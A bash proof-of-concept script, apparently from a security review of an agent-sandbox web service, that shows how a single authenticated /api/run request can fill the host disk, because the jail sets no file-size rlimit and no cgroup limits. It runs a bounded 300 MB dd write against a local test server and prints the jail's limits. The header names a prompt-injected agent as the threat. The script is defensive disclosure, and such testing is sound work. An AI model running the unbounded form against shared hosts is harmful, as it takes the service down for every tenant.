#!/usr/bin/env bash
# MITIGATED in the web UI: per-file RLIMIT_FSIZE (64 MiB) and a size-capped --data fs (web/README.md). escrow itself still sets no rlimits/cgroups.
# Breaker PoC (web-ui branch): a single authenticated /api/run lets a hostile
# agent write an unbounded amount to the HOST disk. The jail has no RLIMIT_FSIZE
# and no memory/pids cgroup limit (only namespace isolation via CLONE_NEWCGROUP),
# so the agent's overlay upper + the recorded change set grow without bound on
# the host filesystem. web/server.py's guards do NOT cover this:
#   - MAX_OUT / drain() cap stdout/stderr BYTES, not files on disk.
#   - RUN_TIMEOUT is 120s wall-clock; dd fills many GB in that window.
# One shared world, one box: filling the disk takes the service (and the host)
# down for every tenant. A prompt-injected Claude agent (claude mode) triggers
# this with no user intent -- exactly the threat model.
#
# This PoC is SAFE: it writes a bounded 300 MB file, measures the ~2x on-disk
# amplification (overlay upper + runs/<id> record copy), and prints the jail's
# resource limits to show nothing caps file size / address space. It does NOT
# fill the real disk.
#
# Root cause: no setrlimit(RLIMIT_FSIZE/AS) and no cgroup memory.max/pids.max on
# the jailed child (src/jail.c jail_run sets namespaces only); web/server.py
# adds only byte/time caps on output, not disk. cf. private/ship-m2/triage.md:43
# which flags "log file is unbounded" -- this is the broader change-set version.
#
# Usage: web-disk-exhaust.sh <escrow-web-bin> <python3-bin>
set -euo pipefail
WEB=${1:?escrow-web bin}; PY=${2:?python3 bin}
D=$(mktemp -d); trap '[ -n "${SRV-}" ] && kill "$SRV" 2>/dev/null; rm -rf "$D" 2>/dev/null || { chmod -R u+rwx "$D" 2>/dev/null; rm -rf "$D"; }' EXIT
"$PY" -I - "$D/data" "$WEB" <<'PYE'
import sys, secrets, importlib.util, subprocess, pathlib
src=subprocess.check_output(["sed","-n","s|.* \\(/nix/store/[^ ]*/server.py\\).*|\\1|p",sys.argv[2]]).decode().strip()
sp=importlib.util.spec_from_file_location("srv",src); m=importlib.util.module_from_spec(sp); sp.loader.exec_module(m)
d=pathlib.Path(sys.argv[1]); d.mkdir(parents=True,exist_ok=True); s=secrets.token_bytes(16)
(d/"users").write_text(f"t {s.hex()} {m.scrypt('poc-password-123',s).hex()}\n")
PYE
PORT=$("$PY" -I -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()')
"$WEB" serve --data "$D/data" --listen 127.0.0.1:$PORT >"$D/log" 2>&1 & SRV=$!
sleep 2; U=http://127.0.0.1:$PORT
curl -s -c "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' \
  --data-binary '{"user":"t","password":"poc-password-123"}' $U/api/login >/dev/null
j(){ curl -s -b "$D/cj" -H 'X-Escrow: 1' -H 'Content-Type: application/json' --data-binary "$2" $U$1; }

echo "state size before:        $(du -sm "$D/data/world/state" 2>/dev/null | cut -f1 || echo 0) MB"
RUN='{"persona":"alice","mode":"command","text":"dd if=/dev/zero of=big.bin bs=1M count=300 2>/dev/null; echo wrote 300MB"}'
j /api/run "$RUN" | "$PY" -I -c 'import sys,json;d=json.load(sys.stdin);print("run ok =",d["ok"],"(agent exit",d["code"],")")'
echo "state size after 1 run:   $(du -sm "$D/data/world/state" 2>/dev/null | cut -f1) MB  (300MB agent file -> ~2x on host: upper + record)"

echo "--- jail resource limits (agent view; nothing caps disk or memory) ---"
RID=$(j /api/run '{"persona":"alice","mode":"command","text":"egrep \"Max file size|Max address space\" /proc/self/limits; echo controllers: $(cat /sys/fs/cgroup/cgroup.controllers 2>/dev/null || echo none-in-jail)"}' \
  | "$PY" -I -c 'import sys,json,re;print(re.search(r"proposed (\w+)",json.load(sys.stdin)["stderr"]).group(1))')
curl -s -b "$D/cj" "$U/api/agentlog?id=$RID" | "$PY" -I -c 'import sys,json;print(json.load(sys.stdin)["text"].strip())'
echo "--> unlimited file size + no in-jail cgroup controllers = one request can fill the host disk (box down for all tenants)."
